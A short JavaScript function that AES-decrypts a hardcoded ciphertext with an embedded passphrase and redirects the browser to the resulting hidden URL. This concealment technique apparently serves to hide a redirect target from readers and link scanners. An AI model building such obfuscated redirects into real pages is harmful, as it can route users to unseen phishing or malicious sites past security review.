function decryptjs() {

var decrypted = CryptoJS.AES.decrypt("U2FsdGVkX1+lCOyBNFHt9EHYQGninWEFbOKtbo+1/W9phBw5yMcQJRWFIqimGGpii1SIg3l+kLsy8jqv7eHF+F5TqeMbQldUMJty+Z4Bw93XbD8HtPFlHEW66xHWDfc+Cw2WkqJyy0wyJg4Z5dLvvlgXr41ShwLJj90/RNY11tA=",
 "W0Ca19sNat1tGuf");

window.location.href = ""+decrypted.toString(CryptoJS.enc.Utf8)+"";
}